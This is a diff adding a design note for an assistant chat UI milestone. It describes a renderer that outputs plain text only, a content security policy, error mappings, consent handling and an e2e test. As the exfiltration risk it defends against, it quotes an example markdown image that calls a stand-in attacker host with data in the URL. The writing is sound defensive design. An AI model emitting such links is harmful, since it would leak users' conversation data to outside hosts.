@@ -2008,6 +2008,55 @@ separator, which made git treat the file as binary — so that analyser's logic
 shipped through PR #26 with no reviewable diff at all. Keying by nested maps
 removes the separator question entirely.
 
+### M11 — the assistant conversation surface (in progress)
+
+M10 shipped the assistant service complete and a UI that deliberately stopped
+short of chat, leaving the conversation routes with no consumer — the
+zero-callers shape M10 was bitten by twice. It also left a debt: the M10 review
+reopened docs/03 §6d's model-output exfiltration risk and owed the rendering
+constraint "in the same PR as the first pixel of model-authored text". This is
+that PR, so the constraint is its opening obligation rather than a follow-up.
+
+**The renderer is the control, and it is an absence rather than a filter.**
+`MessageText` builds text nodes: no parser, no allowlist, no dependency, no
+`dangerouslySetInnerHTML` — a source scan over the whole app enforces the last
+one, with `app/layout.tsx`'s theme script as the single declared exemption (the
+credential-graph habit of stating exceptions as data). A model-emitted
+`![](https://attacker/?d=…)` renders as those characters. Both roles go through
+the same component: the user's own text carries no new risk, but one renderer
+for both is what stops a later edit giving the assistant's half a richer path.
+Behind it, a CSP with `img-src 'self' data:` and `connect-src 'self'` — honest
+about what it does NOT do, since `script-src` still allows inline until Next's
+bootstrap gets nonces.
+
+**Two BFF mappings carry meaning.** The assistant's uniform 404 stays uniform
+(it is the anti-enumeration control, so "no such conversation" and "someone
+else's" must remain indistinguishable), while `assistant_disabled` becomes its
+own code — the one refusal a user can act on. A turn also gets its own deadline,
+deliberately ABOVE the assistant's per-provider-call bound: a BFF that gave up
+first would abandon a turn the service is still committing, with the
+conversation's row lock held, and report failure for an answer that then lands
+in the transcript unread.
+
+**Consent is rendered as a state, not discovered as an error.** With the master
+switch off — which the turn route now refuses outright, per the M10 review — the
+composer is replaced by an explanation and a link. A box that takes what you
+type and throws it away is the worse answer.
+
+**Running the real app found a defect again**, the third milestone in a row.
+`gqlRequest` answers `ok` for any `data` object, so an ordinary version skew
+between client and BFF arrives as `{"data":{}}` — and dereferencing it
+white-screened the page. The panel now treats a response missing its fields as
+NO DATA rather than as data (the peer-client rule, applied in the browser):
+"we couldn't load this" beats a blank screen, and beats an empty list that reads
+as a claim about the account.
+
+The stack e2e extends the existing dev-journey test rather than adding one, so
+the workflow counts stay 16/4 and 9/11: a real conversation over HTTP, the
+encrypted transcript read back in order, `assistant.turn.completed` in the
+verified audit chain, and — the M10 review's fix, asserted live — the turn route
+refusing once consent is revoked.
+
 ### Later milestones (rough order, one per bounded context)
 Referral · search · the M5 cloud half, reduced by what M8 took over.
 Settlement came late deliberately: highest-risk domains land on mature
